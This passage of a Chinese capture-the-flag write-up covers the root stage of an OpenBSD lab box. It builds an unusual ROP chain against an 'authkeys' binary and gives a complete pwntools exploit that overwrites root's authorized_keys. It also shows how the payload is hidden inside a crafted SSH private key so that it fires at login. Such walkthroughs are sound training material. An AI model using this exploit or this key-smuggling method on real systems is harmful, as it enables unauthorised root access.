由于程序太小，直接搜索常规gadget，发现几乎没有！64位rop需要控制rdi，rsi，rdx的gadget。这里是本box第二个难点。
    $ ROPgadget --binary ./authkeys --only "pop|ret"
    Gadgets information
    ============================================================
    0x000000000040036a : pop rdx ; ret
    0x000000000040028a : ret
    Unique gadgets found: 2
使用`ROPgadget --binary ./authkeys
--all`可以列出所有gadget，我们先解决控制rdi，rsi，rdx的问题，首先把涉及到这三个寄存器的gadget提取出来。
    0x0000000000400380: cvtss2si esi, xmm0; ret;
    0x000000000040037b: movss xmm0, dword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;
    0x000000000040037c: movups xmm0, xmmword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;
    0x0000000000400367: mov rdi, rsi; pop rdx; ret;
    0x0000000000400368: mov edi, esi ; pop rdx ; ret
    0x000000000040036a: pop rdx; ret;
看似没有可以直接控制rdi和rsi的gadget，这里使用一个非常巧妙的方法，通过向xmm0传入一个单精度浮点数，然后在把浮点数转成整数传入esi，然后用`mov
rdi, rsi`间接控制rdi。浮点数的二进制表示是一个特殊的存在，需要先了解一下。
浮点数的表示方法:
国际标准IEEE 754规定，任意一个二进制浮点数V都可以表示成下列形式：
  * (-1)^s 表示符号位，当s=0，V为整数；s=1，V为负数；
  * M 表示有效数字，1≤M 32位的单精度浮点数，最高1位是符号位s，接着的8位是指数E，剩下的23位是有效数字M  
>  64位的双精度浮点数，最高1位是符号位s，接着的11位是指数E，剩下的52位为有效数字M
那么单精度浮点数最大的有效数字为：
    >>> hex(int(0b11111111111111111111111))
    '0x7fffff'
计算浮点数的二进制python代码如下：
    def float2bin_32(num):
      return ''.join(bin(ord(c)).replace('0b', '').rjust(8, '0') for c in struct.pack('!f', num))
由于只能控制esi，因此数值不能太大，程序没开PIE，可以将用到的字符串，地址之类写在payload的开头，此部分数据会复制到bss段，bss段在0x601000，在单精度浮点数的有效数值范围内。
下一步就是如何控制rax，程序中也是没用直接控制的gadget，这里可以使用`mov eax,
0xffffffff`，先赋一个数值到eax，然后通过`shr eax`和`not al`构造想要的数值。
    0x0000000000400394: mov eax, 0xffffffff; xor rcx, rcx; ret;
    0x0000000000400370: shr eax, 1; ret;
    0x000000000040036d: not al ; adc cl, 0xe8 ; ret
以下是构造的例子，利用这两个gadget可以构造任意数值：
    # execve
    00000000 00000000 00111111 xxxxxxxx shr*18
    00000000 00000000 00011111 1xxxxxxx shr
    00000000 00000000 00001111 11xxxxxx shr
    00000000 00000000 00001111 00xxxxxx not
    00000000 00000000 00000111 100xxxxx shr
    00000000 00000000 00000111 011xxxxx not
    00000000 00000000 00000000 00111011 shr*5
    # open 5
    00000000 00000000 00000111 xxxxxxxx shr*21
    00000000 00000000 00000011 1xxxxxxx shr
    00000000 00000000 00000011 0xxxxxxx not
    00000000 00000000 00000001 10xxxxxx shr
    00000000 00000000 00000001 01xxxxxx not
    00000000 00000000 00000000 00000101 shr*6
    # write 4
    00000000 00000000 00000001 11xxxxxx shr*23
    00000000 00000000 00000001 00xxxxxx not
    00000000 00000000 00000000 00000100 shr*6
解决这两个问题后，剩下就是常规ROP的套路。
###  exp编写
需要安装一个OpenBSD6.8进行调试，由于OpenBSD系统调用不同，Ubuntu的gdb无法调试本程序。
base64decode后溢出长度0x308，其中前0x300字节复制到0x6010c0，这部分可以用于存放rop需要使用的字符串。
这里先给出最终exp，rop为将自己的公钥写入root的authorized_keys，其中payload开头为私钥存储的格式，以及写入路径和自己的公钥，最终payload也根据ssh
key格式进行了调整。详细见下面ssh key的分析。
    from pwn import *
    import struct, base64
    context.log_level = 'DEBUG'
    def float2bin_32(num):
      return ''.join(bin(ord(c)).replace('0b', '').rjust(8, '0') for c in struct.pack('!f', num))
    cvtss2si_esi = 0x0000000000400380# cvtss2si esi, xmm0; ret;
    movss_xmm0 = 0x000000000040037b# movss xmm0, dword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;
    movups_xmm0 = 0x000000000040037c# movups xmm0, xmmword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;
    syscall = 0x00000000004003cf# syscall; ret;
    mov_rdi_rsi_prdx = 0x0000000000400367# mov rdi, rsi; pop rdx; ret;
    prdx = 0x000000000040036a# pop rdx; ret;
    mov_eax_fff = 0x0000000000400394# mov eax, 0xffffffff; xor rcx, rcx; ret;
    shr_eax = 0x0000000000400370# shr eax, 1; ret;
    not_al = 0x000000000040036d# not al; adc cl, 0xe8; ret;
    leave_ret = 0x000000000040039c# leave; ret;
    payload = '000000077373682D727361000000030100010000080100AA838C7400F1A8CC2E'.decode('hex')
    payload += '/root/.ssh/authorized_keys'.ljust(0x20,'\x00') 
    payload += '\nssh-ed25519 AAAAC3NzaCxxxxxxxxxxxxxxxxxxxxxxxxLUMUMEaHnPM\n'.ljust(0x60,'a') # 0x60
    payload += p32(int(float2bin_32(6295776.01),2)) + p32(int(float2bin_32(2.01),2)) # 0x601160
    payload += p32(int(float2bin_32(3.01),2)) + p32(int(float2bin_32(6295808.01),2)) # 0x601168
    payload = payload.ljust(0x308,'a')
    # rdi = 0x6010c0
    payload += p64(prdx) + p64(0x601160)
    payload += p64(movss_xmm0) + p64(cvtss2si_esi)
    payload += p64(mov_rdi_rsi_prdx) + p64(0)
    # rsi = 2
    payload += p64(prdx) + p64(0x601164)
    payload += p64(movss_xmm0) + p64(cvtss2si_esi)
    # rdx = 0
    payload += p64(prdx) + p64(0)
    # rax = 5
    payload += p64(mov_eax_fff)
    payload += p64(shr_eax)*22
    payload += p64(not_al)
    payload += p64(shr_eax)
    payload += p64(not_al)
    payload += p64(shr_eax)*6
    # syscall
    payload += p64(syscall)
    # rdi = 3
    payload += p64(prdx) + p64(0x601168)
    payload += p64(movss_xmm0) + p64(cvtss2si_esi)
    payload += p64(mov_rdi_rsi_prdx) + p64(0)
    # rsi = 0x6010e0
    payload += p64(prdx) + p64(0x60116c)
    payload += p64(movss_xmm0) + p64(cvtss2si_esi)
    # rdx = 0x50
    payload += p64(prdx) + p64(0x52)
    # rax = 4
    payload += p64(mov_eax_fff)
    payload += p64(shr_eax)*23
    payload += p64(not_al)
    payload += p64(shr_eax)*6
    # syscall
    payload += p64(syscall)
    payload = payload.ljust(0x817,'a')
    print base64.b64encode(payload)
    print len(base64.b64encode(payload))
## SSH rsa key
因为触发溢出在使用私钥登陆的时候，因此需要将溢出payload打包进私钥里面，由于payload很长，因此需要使用N非常大的数进行生成密钥对，这里使用了16384bit长度的N。
    ssh-keygen -t rsa -b 16384
    -rw-------  1 root    root     12717 Mar 13 13:55 iii
    -rw-r--r--  1 root    root      2783 Mar 13 12:54 iii.pub
下面简单分析一下ssh key的格式。
公钥文件的内容由3个字段组成（使用空格分隔），其中第二段base64就是公钥本身。
    $ awk '{print $2}' ./iii.pub| base64 -d | hexdump -C   
    00000000  00 00 00 07 73 73 68 2d  72 73 61 00 00 00 03 01  |....ssh-rsa.....|
    00000010  00 01 00 00 08 01 00 aa  83 8c 74 00 f1 a8 cc 2e  |..........t.....|
    00000020  9b 01 cd 91 4d 05 68 14  ee 6a 3e 3f d7 f7 84 39  |....M.h..j>?...9|
    00000030  ef 48 e4 bd 7e b7 31 01  24 fd a3 4f c5 e3 44 0e  |.H..~.1.$..O..D.|
    00000040  8a 0d 51 30 de d8 85 11  4a be b0 5c 11 87 1b b8  |..Q0....J..\....|
    00000050  e5 40 48 ea 9f d0 50 7c  34 fd c2 16 ea ed a6 4a  |.@H...P|4......J|
    00000060  74 67 7f 0d 63 a9 76 40  8f ac f7 a0 5c 6b ef 9b  |tg..c.v@....\k..|
`00000007`表示后面跟着7字节长度，也就是`ssh-rsa`的ASCII。接着的3字节为`010010`也就是65535，常用rsa中的exponent e。如此类推，再后面的是rsa中的N，一个超大的数值。
用同样的方法分析私钥的结构，可以发现私钥中包含了完整的公钥信息，留意下面`ssh-rsa`开始的部分。
    $ cat iii | grep -v -- '--'|  base64 -d | hexdump -C | more
    00000000  6f 70 65 6e 73 73 68 2d  6b 65 79 2d 76 31 00 00  |openssh-key-v1..|
    00000010  00 00 04 6e 6f 6e 65 00  00 00 04 6e 6f 6e 65 00  |...none....none.|
    00000020  00 00 00 00 00 00 01 00  00 08 17 00 00 00 07 73  |...............s|
    00000030  73 68 2d 72 73 61 00 00  00 03 01 00 01 00 00 08  |sh-rsa..........|
    00000040  01 00 aa 83 8c 74 00 f1  a8 cc 2e 9b 01 cd 91 4d  |.....t.........M|
    00000050  05 68 14 ee 6a 3e 3f d7  f7 84 39 ef 48 e4 bd 7e  |.h..j>?...9.H..~|
    00000060  b7 31 01 24 fd a3 4f c5  e3 44 0e 8a 0d 51 30 de  |.1.$..O..D...Q0.|
    00000070  d8 85 11 4a be b0 5c 11  87 1b b8 e5 40 48 ea 9f  |...J..\.....@H..|
    00000080  d0 50 7c 34 fd c2 16 ea  ed a6 4a 74 67 7f 0d 63  |.P|4......Jtg..c|
要完整了解整个私钥的结构有一定困难，不过我们的目标不是构造一个可用的私钥，关键是把溢出payload打包进去。思路是通过替换存储公钥信息部分的内容，类似`new_id_rsa
= id_rsa[:priv_offset] + exp + id_rsa[priv_offset +
len(exp):]`，把payload存储到私钥中，使用这个私钥进行登录时，payload就可以传入到authkeys中。
写一个脚本进行私钥构造：
    # cat iii | grep -v -- '--'|  base64 -d > pri.bin
    org_key = open('pri.bin','rb').read() 
    print len(org_key)
    import base64
    exp = base64.b64decode('base64exp')
    print len(exp)
    new_key = org_key[:0x2b] + exp + org_key[0x2b+len(exp):]
    print len(new_key)
    f = open('new_key','wb')
    f.write(new_key)
    f.close()
    cat new_key|base64 > new_id_rsa
最后需要加上私钥的开头结尾
    -----BEGIN OPENSSH PRIVATE KEY-----    xxxxxxxxxxxxxxxxxx
    -----END OPENSSH PRIVATE KEY-----    
由于`attendedgw`的ssh端口在内网，需要把`attendedgw`的ssh端口转发到kali，方法很多在此不再详述（frp，ew，nps，ssh任君选择），然后在OpenBSD中使用我们构造的私钥进行ssh登录，触发exp写入公钥后，即可使用自己的正常私钥登录attendedgw。
## 最后
user部分涉及了邮件伪造，vim漏洞利用，ssh
config配置文件利用，带有一定脑洞，需要揣摩出题人的思路和后台自动脚本的动作。root部分就是纯粹而精妙的漏洞利用，ropchain的构造非常值得一学。